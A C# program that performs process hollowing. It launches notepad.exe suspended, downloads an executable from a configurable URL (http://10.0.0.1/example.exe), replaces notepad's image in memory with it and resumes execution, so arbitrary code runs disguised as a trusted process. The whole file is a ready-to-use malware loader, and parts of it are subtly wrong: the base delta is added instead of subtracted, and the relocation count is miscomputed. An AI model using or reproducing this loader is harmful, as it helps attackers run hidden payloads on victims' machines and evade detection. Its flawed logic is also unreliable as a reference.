using System.Text;
using System.Runtime.Versioning;
using System.Runtime.InteropServices;
using Windows.Win32.Foundation;
using Windows.Win32.System.Memory;
using Windows.Win32.System.Threading;
using Windows.Win32.System.SystemServices;
using Windows.Win32.System.Diagnostics.Debug;
using static Windows.Win32.PInvoke;
using static Windows.Wdk.PInvoke;

[SupportedOSPlatform("windows5.1.6200")]
public class Program
{
    // CHANGE THESE
    const string MASK_PATH = "C:\\Windows\\System32\\notepad.exe";
    const string PAYLOAD_URL = "http://10.0.0.1/example.exe";
    const int PEB_IMAGE_BASE_OFFSET = 16;
    const int ERROR_INVALID_ADDRESS = 0x000001E7;

    // Structures for marshalling relocation table blocks
    public struct RELOCATION_BLOCK_HEADERS
    {
        public uint PageAddress;
        public uint BlockSize;
    }

    public struct RELOCATION_BLOCK_ENTRY
    {
        public ushort Value;
    }

    public static int Main()
    {
        unsafe
        {
            // Spawn mask process, find and traverse PEB to resolve mask image base address
            Console.WriteLine("[*] Spawning mask process... ");
            STARTUPINFOW startupInfo = new();
            PROCESS_INFORMATION processInformation = new();
            PROCESS_CREATION_FLAGS creationFlags = PROCESS_CREATION_FLAGS.CREATE_SUSPENDED | PROCESS_CREATION_FLAGS.DETACHED_PROCESS;
            fixed (char* maskPathPtr = MASK_PATH)
            {
                if (CreateProcess(maskPathPtr, null, null, null, false, creationFlags, null, null, &startupInfo, &processInformation) == 0)
                {
                    int err = Marshal.GetLastWin32Error();
                    Console.WriteLine("ERROR: Failed to spawn mask (CreateProcess) (0x{0})", err.ToString("X"));
                    return err;
                }
            }

            Console.WriteLine("[*] Resolving mask image base address...");
            HANDLE processHandle = processInformation.hProcess;
            PROCESS_BASIC_INFORMATION processBasicInformation = new();
            uint returnLength;
            NTSTATUS ntstatus = NtQueryInformationProcess(processHandle, 0, &processBasicInformation, (uint)sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
            if (ntstatus.Value != 0)
            {
                Console.WriteLine("ERROR: Failed to fetch PEB base address (NtQueryInformationProcess) (0x{0})", ntstatus.Value.ToString("X"));
                return ntstatus.Value;
            }

            IntPtr maskPEBImageBase = (IntPtr)processBasicInformation.PebBaseAddress + PEB_IMAGE_BASE_OFFSET;
            IntPtr maskImageBase;
            nuint bytesRead;
            if (ReadProcessMemory(processHandle, (void*)maskPEBImageBase, &maskImageBase, (uint)sizeof(IntPtr), &bytesRead) == 0)
            {
                int err = Marshal.GetLastWin32Error();
                Console.WriteLine("ERROR: Failed to read image base address from PEB (ReadProcessMemory) (0x{0})", err.ToString("X"));
                return err;
            }

            Console.WriteLine("Mask PID: {0}", processInformation.dwProcessId);
            Console.WriteLine("Mask PEB base address: 0x{0}", ((IntPtr)processBasicInformation.PebBaseAddress).ToString("X"));
            Console.WriteLine("Mask image base address: 0x{0}", maskImageBase.ToString("X"));

            Console.WriteLine("[*] Fetching payload image...");
            HttpClient client = new();
            HttpResponseMessage response = client.GetAsync(PAYLOAD_URL).Result;
            byte[] payloadImage = response.Content.ReadAsByteArrayAsync().Result;
            if (!response.IsSuccessStatusCode)
            {
                int err = ((int)response.StatusCode);
                Console.WriteLine("ERROR: Failed to download payload image ({0})", err);
                return err;
            }

            fixed (byte* payloadImagePtr = payloadImage)
            {
                Console.WriteLine("[*] Parsing payload image headers...");
                IMAGE_DOS_HEADER payloadImageDOSHeaders = Marshal.PtrToStructure<IMAGE_DOS_HEADER>((IntPtr)payloadImagePtr);
                IMAGE_NT_HEADERS64 payloadImageNTHeaders = Marshal.PtrToStructure<IMAGE_NT_HEADERS64>((IntPtr)payloadImagePtr + payloadImageDOSHeaders.e_lfanew);

                Console.WriteLine("[*] Zeroing mask image memory...");
                ntstatus = ZwUnmapViewOfSection(processHandle, (void*)maskImageBase);
                if (ntstatus.Value != 0)
                {
                    Console.WriteLine("ERROR: Failed to unmap target image memory (ZwUnmapViewOfSection) (0x{0})", ntstatus.Value.ToString("X"));
                    return ntstatus.Value;
                }

                Console.WriteLine("[*] Allocating payload image memory...");
                VIRTUAL_ALLOCATION_TYPE allocationType = VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE | VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT;
                PAGE_PROTECTION_FLAGS protectionFlags = PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE;
                IntPtr payloadImageBase = (IntPtr)VirtualAllocEx(processHandle, (void*)maskImageBase, payloadImageNTHeaders.OptionalHeader.SizeOfImage, allocationType, protectionFlags);
                if (payloadImageBase == IntPtr.Zero)
                {
                    int err = Marshal.GetLastWin32Error();
                    // If memory cannot be allocated at the previous base address
                    if (err == ERROR_INVALID_ADDRESS)
                    {
                        // Try to allocate memory anywhere
                        payloadImageBase = (IntPtr)VirtualAllocEx(processHandle, null, payloadImageNTHeaders.OptionalHeader.SizeOfImage, allocationType, protectionFlags);
                    }

                    if (payloadImageBase == IntPtr.Zero)
                    {
                        Console.WriteLine("ERROR: Failed to allocate payload image memory (VirtualAllocEx) (0x{0})", err.ToString("X"));
                        return err;
                    }
                    
                    // Update PEB structure with new payload base address
                    if (WriteProcessMemory(processHandle, (void*)maskPEBImageBase, &payloadImageBase, (uint)sizeof(IntPtr), null) == 0)
                    {
                        err = Marshal.GetLastWin32Error();
                        Console.WriteLine("ERROR: Failed to update PEB (WriteProcessMemory) (0x{1})", err.ToString("X"));
                        return err;
                    }
                }
                
                long imageBaseDelta = (long)payloadImageBase + (long)payloadImageNTHeaders.OptionalHeader.ImageBase;
                Console.WriteLine("Payload image base address: 0x{0}", payloadImageBase.ToString("X"));
                Console.WriteLine("Image base delta: 0x{0}", imageBaseDelta.ToString("X"));

                Console.WriteLine("[*] Writing payload image headers...");
                // Update image base address in payload image bytes before writing
                // This prevents the 0xc0000005 error
                Marshal.WriteIntPtr((IntPtr)(payloadImagePtr
                    + payloadImageDOSHeaders.e_lfanew
                    + Marshal.OffsetOf<IMAGE_NT_HEADERS64>("OptionalHeader").ToInt64()
                    + Marshal.OffsetOf<IMAGE_OPTIONAL_HEADER64>("ImageBase").ToInt64()),
                    payloadImageBase);

                nuint bytesWritten;
                if (WriteProcessMemory(processHandle, (void*)payloadImageBase, payloadImagePtr, payloadImageNTHeaders.OptionalHeader.SizeOfHeaders, &bytesWritten) == 0)
                {
                    int err = Marshal.GetLastWin32Error();
                    Console.WriteLine("ERROR: Failed to write payload image headers at 0x{0} (WriteProcessMemory) (0x{1})", payloadImageBase.ToString("X"), err.ToString("X"));
                    return err;
                }

                Console.WriteLine("[*] Writing payload image sections...");
                IntPtr payloadImageFirstSectionPtr = (IntPtr)(payloadImagePtr + payloadImageDOSHeaders.e_lfanew + sizeof(IMAGE_NT_HEADERS64));
                ulong payloadImageCurrentSectionOffset = 0;
                for (int i = 0; i < payloadImageNTHeaders.FileHeader.NumberOfSections; i++)
                {
                    IMAGE_SECTION_HEADER payloadImageCurrentSection = Marshal.PtrToStructure<IMAGE_SECTION_HEADER>((IntPtr)((ulong)payloadImageFirstSectionPtr + payloadImageCurrentSectionOffset));
                    IntPtr maskCurrentSectionLocation = (IntPtr)((ulong)payloadImageBase + payloadImageCurrentSection.VirtualAddress);
                    IntPtr payloadCurrentSectionLocation = (IntPtr)((ulong)payloadImagePtr + payloadImageCurrentSection.PointerToRawData);
                    string currentSectionName = Encoding.UTF8.GetString(payloadImageCurrentSection.Name.AsReadOnlySpan());
                    if (WriteProcessMemory(processHandle, (void*)maskCurrentSectionLocation, (void*)payloadCurrentSectionLocation, payloadImageCurrentSection.SizeOfRawData, &bytesWritten) == 0)
                    {
                        int err = Marshal.GetLastWin32Error();
                        Console.WriteLine("ERROR: Failed to write payload image section {0} at 0x{1} (WriteProcessMemory) (0x{2})", currentSectionName, maskCurrentSectionLocation.ToString("X"), err.ToString("X"));
                        return err;
                    }

                    payloadImageCurrentSectionOffset += (uint)sizeof(IMAGE_SECTION_HEADER);
                    Console.WriteLine("{0}\t0x{1}", currentSectionName, maskCurrentSectionLocation.ToString("X"));
                }

                // Obtain reloc table address via data directory
                // Relying on .reloc section name is not reliable
                IMAGE_DATA_DIRECTORY payloadImageRelocDirectory = payloadImageNTHeaders.OptionalHeader.DataDirectory._5;
                if (payloadImageRelocDirectory.VirtualAddress != 0)
                {
                    Console.WriteLine("[*] Performing relocations...");
                    IntPtr payloadImageRelocTablePtr = (IntPtr)((ulong)payloadImageBase + payloadImageRelocDirectory.VirtualAddress);
                    int payloadImageRelocTableOffset = 0;

                    while (payloadImageRelocTableOffset < payloadImageRelocDirectory.Size)
                    {
                        IntPtr payloadImageRelocBlockPtr = payloadImageRelocTablePtr + payloadImageRelocTableOffset;
                        RELOCATION_BLOCK_HEADERS payloadImageRelocBlockHeaders;
                        if (ReadProcessMemory(processHandle, (void*)payloadImageRelocBlockPtr, &payloadImageRelocBlockHeaders, (uint)sizeof(RELOCATION_BLOCK_HEADERS), &bytesRead) == 0)
                        {
                            int err = Marshal.GetLastWin32Error();
                            Console.WriteLine("ERROR: Failed to read relocation block headers at 0x{0} (ReadProcessMemory) (0x{1})", payloadImageRelocBlockPtr.ToString("X"), err.ToString("X"));
                            return err;
                        }

                        payloadImageRelocTableOffset += sizeof(RELOCATION_BLOCK_HEADERS);
                        if (payloadImageRelocBlockHeaders.PageAddress == 0)
                        {
                            break;
                        }

                        int payloadImageRelocBlockEntries = (int)payloadImageRelocBlockHeaders.BlockSize - sizeof(RELOCATION_BLOCK_HEADERS) / sizeof(RELOCATION_BLOCK_ENTRY);
                        for (int i = 0; i < payloadImageRelocBlockEntries; i++)
                        {
                            IntPtr payloadImageRelocEntryPtr = payloadImageRelocTablePtr + payloadImageRelocTableOffset;
                            RELOCATION_BLOCK_ENTRY payloadImageRelocBlockEntry;
                            if (ReadProcessMemory(processHandle, (void*)payloadImageRelocEntryPtr, &payloadImageRelocBlockEntry, (uint)sizeof(RELOCATION_BLOCK_ENTRY), &bytesRead) == 0)
                            {
                                int err = Marshal.GetLastWin32Error();
                                Console.WriteLine("ERROR: Failed to read relocation entry at 0x{0} (ReadProcessMemory) (0x{1})", payloadImageRelocEntryPtr.ToString("X"), err.ToString("X"));
                                return err;
                            }

                            payloadImageRelocTableOffset += sizeof(RELOCATION_BLOCK_ENTRY);
                            uint payloadImageRelocEntryType = (uint)(payloadImageRelocBlockEntry.Value >> 12) & 0xF;
                            uint payloadImageRelocEntryOffset = (uint)(payloadImageRelocBlockEntry.Value & 0xFFF);
                            if (payloadImageRelocEntryType == 0)
                            {
                                continue;
                            }

                            IntPtr patchPtr = (IntPtr)((ulong)payloadImageBase + payloadImageRelocBlockHeaders.PageAddress + payloadImageRelocEntryOffset);
                            long patch = 0;
                            if (ReadProcessMemory(processHandle, (void*)patchPtr, &patch, (uint)sizeof(long), &bytesRead) == 0)
                            {
                                int err = Marshal.GetLastWin32Error();
                                Console.WriteLine("ERROR: Failed to read patch address at 0x{0} (ReadProcessMemory) (0x{1})", patchPtr.ToString("X"), err.ToString("X"));
                                return err;
                            }

                            patch += imageBaseDelta;
                            if (WriteProcessMemory(processHandle, (void*)patchPtr, &patch, (nuint)sizeof(IntPtr), &bytesWritten) == 0)
                            {
                                int err = Marshal.GetLastWin32Error();
                                Console.WriteLine("ERROR: Failed to write patch address at 0x{0} (WriteProcessMemory) (0x{1})", patchPtr.ToString("X"), err.ToString("X"));
                                return err;
                            }
                        }
                    }
                }

                Console.WriteLine("[*] Resuming process...");
                HANDLE threadHandle = processInformation.hThread;
                CONTEXT threadContext = new()
                {
                    ContextFlags = CONTEXT_FLAGS.CONTEXT_INTEGER_AMD64
                };

                if (GetThreadContext(threadHandle, &threadContext) == 0)
                {
                    Console.WriteLine("ERROR: Failed to fetch thread context (GetThreadContext) (0x{0})", Marshal.GetLastWin32Error().ToString("X"));
                    return Marshal.GetLastWin32Error();
                }

                threadContext.Rcx = (ulong)payloadImageBase + payloadImageNTHeaders.OptionalHeader.AddressOfEntryPoint;
                if (SetThreadContext(threadHandle, &threadContext) == 0)
                {
                    Console.WriteLine("ERROR: Failed to set thread context (SetThreadContext) (0x{0})", Marshal.GetLastWin32Error().ToString("X"));
                    return Marshal.GetLastWin32Error();
                }

                if ((int)ResumeThread(processInformation.hThread) == -1)
                {
                    Console.WriteLine("ERROR: Failed to resume thread (ResumeThread) (0x{0})", Marshal.GetLastWin32Error().ToString("X"));
                    return Marshal.GetLastWin32Error();
                }
            }
        }

        return 0;
    }
}
